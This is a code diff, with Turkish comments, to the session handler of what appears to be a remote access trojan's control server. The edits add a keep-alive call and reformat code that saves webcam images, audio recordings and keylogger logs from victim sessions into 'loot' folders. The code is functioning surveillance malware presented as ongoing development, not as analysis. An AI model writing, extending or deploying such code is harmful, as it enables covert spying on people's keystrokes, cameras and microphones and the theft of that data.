@@ -221,12 +221,8 @@ class Handler(BaseHandler):
                 )
             print(f"[*] Etkileşim için 'sessions -i {self.session_id}' kullanın.\n")
 
-        # Soket kapanmasın diye bekle
-        try:
-            while getattr(self, "running", True) and self.client_sock:
-                time.sleep(1)
-        except:
-            pass
+        # Peer ölünce dön — aksi halde ölü session listede kalır
+        self.keep_connection_alive(self.client_sock)
 
     def interact(self, session_id: int):
         """
@@ -892,9 +888,7 @@ class Handler(BaseHandler):
                             filename = (
                                 f"webcam_{timestamp}_session{self.session_id}.jpeg"
                             )
-                            save_path = self._loot_save_path(
-                                filename, category="media"
-                            )
+                            save_path = self._loot_save_path(filename, category="media")
 
                             with open(save_path, "wb") as f:
                                 f.write(img_data)
@@ -912,9 +906,7 @@ class Handler(BaseHandler):
 
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                             filename = f"audio_{timestamp}_session{self.session_id}.wav"
-                            save_path = self._loot_save_path(
-                                filename, category="media"
-                            )
+                            save_path = self._loot_save_path(filename, category="media")
 
                             with open(save_path, "wb") as f:
                                 f.write(wav_data)
@@ -934,9 +926,7 @@ class Handler(BaseHandler):
                             filename = (
                                 f"keylog_{timestamp}_session{self.session_id}.txt"
                             )
-                            save_path = self._loot_save_path(
-                                filename, category="logs"
-                            )
+                            save_path = self._loot_save_path(filename, category="logs")
 
                             with open(save_path, "w", encoding="utf-8") as f:
                                 f.write(logs)
